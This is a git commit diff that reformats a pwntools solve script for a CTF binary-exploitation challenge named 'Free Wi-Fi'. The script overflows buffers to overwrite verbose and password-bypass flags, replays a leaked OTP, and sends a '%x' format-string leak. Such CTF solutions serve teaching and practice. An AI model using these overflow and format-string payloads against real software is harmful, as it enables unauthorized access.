9a1be37ba66049e15b0c70b81228f62e7591a08a
Zavier <zavierspamstuff@gmail.com>
2023-05-20 15:43:39 +0800

    Update solve.py
    formatting

--- challenges/pwn/Free Wi-Fi - Ervin Lee/code/solve.py
+++ challenges/pwn/Free Wi-Fi - Ervin Lee/code/solve.py
@@ -1,11 +1,18 @@
 from pwn import *
+
 io = process("./wifi")
-activate_verbose = b"A"*10 + b"ON"
-bypass_password = b"A"*20 + b"TRUE"
+
+activate_verbose = b"A"*10 + b"ON" # Payload 1: Overwrite VERBOSE
+
+bypass_password = b"A"*20 + b"TRUE" # Payload 2: Overwrite BYPASS
+
 io.sendline(activate_verbose)
 io.sendline(bypass_password)
+
 otp = io.recvline_contains(b"X")
+
 io.sendlineafter(b" ", otp)
+
 format_string = b"%x"*25
 io.sendline(format_string)
 io.interactive()
